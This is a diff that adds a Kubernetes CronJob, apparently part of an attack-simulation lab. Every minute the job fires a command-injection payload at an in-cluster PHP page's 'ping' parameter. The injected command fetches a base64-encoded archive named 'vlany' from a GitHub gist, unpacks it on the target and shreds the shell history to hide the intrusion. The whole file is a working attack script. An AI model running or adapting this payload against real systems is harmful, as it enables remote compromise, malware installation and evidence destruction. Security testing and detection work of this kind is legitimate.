@@ -1,0 +1,21 @@
+apiVersion: batch/v1beta1
+kind: CronJob
+metadata:
+  name: actor
+  namespace: web-app
+spec:
+  schedule: "*/1 * * * *"
+  jobTemplate:
+    spec:
+      template:
+        spec:
+          containers:
+          - name: actor
+            image: alpine:latest
+            command: ["/bin/sh"]
+            args:
+            - -c
+            - >
+              apk update && apk add --no-cache curl bash && bash -c 
+              "echo 'www.web-app.svc.cluster.local/exploitable.php?ping=1.1.1.1%3B+curl'; curl 'www.web-app.svc.cluster.local/exploitable.php?ping=1.1.1.1%3B+curl+https%3A%2F%2Fgist.githubusercontent.com%2Fmateobur%2Fd888e36de12f8fe42a18f54ce4b1fc7c%2Fraw%2Fdd0c4cb23db7cc17a2086c5dee9338522fb8ae69%2Fvlany+%7C+base64+-d+%7C+tar+xvzf+-+%3Bshred+%7E%2F.bash_history&submit=submit' --connect-timeout 5 -m 10 -s"
+          restartPolicy: Never
